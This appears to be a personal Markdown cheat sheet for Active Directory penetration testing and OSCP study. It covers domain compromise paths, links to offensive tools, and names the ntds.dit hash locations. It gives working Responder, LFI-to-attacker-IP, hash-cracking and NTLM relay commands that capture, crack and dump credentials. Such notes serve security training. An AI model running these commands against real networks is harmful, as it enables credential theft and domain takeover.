# Active Directory  
AD Overview and tools.   
## Contents 
- [Active Directory](#active-directory)
  * [Contents](#contents)
  * [Active Directory Overview](#active-directory-overview)
  * [My AD Cheatsheets](#my-ad-cheatsheets)
  * [Other Cheat Sheets](#other-cheat-sheets)
  * [References](#references)
    + [Important Files to Check on the DC](#important-files-to-check-on-the-dc)
  * [Tools](#tools)
  * [General Tools](#general-tools)
  * [Responder (not allowed on the OSCP exam, but a common pen testing tool)](#responder--not-allowed-on-the-oscp-exam--but-a-common-pen-testing-tool-)
  
## Active Directory Overview 
To gain control over a domain:  
Compromise member of Domain Admin group.   
Compromise domain controller -> can modify all domain-joined computers or execute applications on them. 

AD: depends on DNS server, typical DC hosts DNS server that is authoritative for a given domain.    
Account types: domain admins, service accounts (can be domain admins), local admins (can't access the DC), domain users.     
Authentication mechanisms: Kerberos (uses ticket granting tickets and services to authenticate users) or NTLM (traditional Windows authentication).     
Kerberos: default authentication service that uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain. Intended to be more secure than NTLM (uses 3rd party ticket authorization and stronger encryption).      
[PayloadAllTheThings - Most Common Paths to AD Compromise](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise)       
Typical AD pen test:
- Exploit host on domain and gain access  as a domain user 
- Enumerate domain users and groups.  
- Privilege escalate or move laterally. 
- Get Domain Admin or Service Account access and onto the domain controller.     

Common Ways to Get AD Creds:    
- NTLM Authenticated Services  
- LDAP Bind Credentials    
- Authentication Relays      
- Microsoft Deployment Toolkit   
- Configuration Files       

## My AD Cheatsheets
[Attacks](https://github.com/lw8192/Red-Team-Rising/blob/main/ActiveDirectory/Attacks.md)        
[Lateral Movement](https://github.com/lw8192/Red-Team-Rising/blob/main/ActiveDirectory/LateralMovement.md)   

 
## Other Cheat Sheets
[AD Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)     
[AD Lateral Movement and Persistence Cheatsheet](https://bhanusnotes.blogspot.com/2020/12/ad-pentest-lateral-movement-persistance.html)  
[AD Cheat sheet](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)   
[Pentesting AD CheatSheet](https://i.ibb.co/TKYNCNP/Pentest-ad.png)  
[Integratio IT Cheat Sheet](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)  

## References      
[WADComs](https://wadcoms.github.io/)    
    
### Important Files to Check on the DC
    %SYSTEMROOT%\System32\ntds.dit             #AD database with user password hashes   
    %SYSTEMROOT%\NTDS\ntds.dit                 #AD backup

## Tools   
C2 Frameworks:
[PowerShell Empire](https://github.com/BC-SECURITY/Empire), Covenant    
[evil-winrm](https://github.com/nubix/evil-winrm): access Windows RM, TCP port 5985 or 5986 open.   
Responder (Spoofing is not allowed in the labs or on the exam)   
Crackmapexec  
[BloodHound](https://github.com/BloodHoundAD/BloodHound), [SharpHound](https://github.com/BloodHoundAD/SharpHound) 
Rubeus   
[Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 )   
[Mimikatz](https://github.com/gentilkiwi/mimikatz), [Mimikatz Cheatsheet](https://offsec.red/mimikatz-cheat-sheet/)      

## General Tools 
[Impacket](https://github.com/SecureAuthCorp/impacket): collection on Python classes for working with network protocols.       

    #if not properly installed 
    apt install impacket-scripts  
    /usr/share/doc/python3-impacket/examples  
    
[ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   

## Responder 
Not allowed on the OSCP exam, but a common pen testing tool.                
Allows you to spoof various services then capture hashes from devices that try to authenticate to those.  
Common use: poison responses during NetNTLM authentication to capture credentials. Might be able to relay the challenge instead of just capturing it (if SMB signing is not enforced). Ref: https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html       
  
Install:   

    git clone https://github.com/lgandx/Responder   
 Recon: RunFinger.py to identify hosts, OS and SMB info          
 
    /opt/Responder/tools $ python3 RunFinger.py -i 172.16.1.1/24       
 Usage:   

     sudo responder.py -I eth0   #start on specified interface. Hashes will be captured when a device tries to authenticate to resources on the network.               
    
You might be able to use a LFI vulnerability to request a resource and capture a hash using Responder. Ex - http://site.com/?page=//10.10.14.25/somefile           
Captured hashes will be stored in the logs folder, in a .txt file named for the protocol hash type and IP captured from.     
Crack Hashes from responder:     

    john hashes.txt   #John the Ripper will automatically detect the format of hashes collected by Responder.    
    hashcat -m 5500   #NTLMv1 (hashes captured from using a tool like Responder)     
    hashcat -m 5600   #NTLMv2 (hashes captured from using a tool like Responder)   

Use NTLMRelay or MultiRelay to relay the credentials to any SMB server which has SMB signing disabled (can't relay the creds back to the source computer unless you are relaying them to a different service). Windows workstations have SMB signing disabled by default.          
[byt3bl33d3r Guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)    
[NTLMRelay - Impacket Script](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)

    sudo python3 ntlmrelayx.py -tf targets -smb2support     
[MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)      

    /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #All auth requests, dump local account hashes   
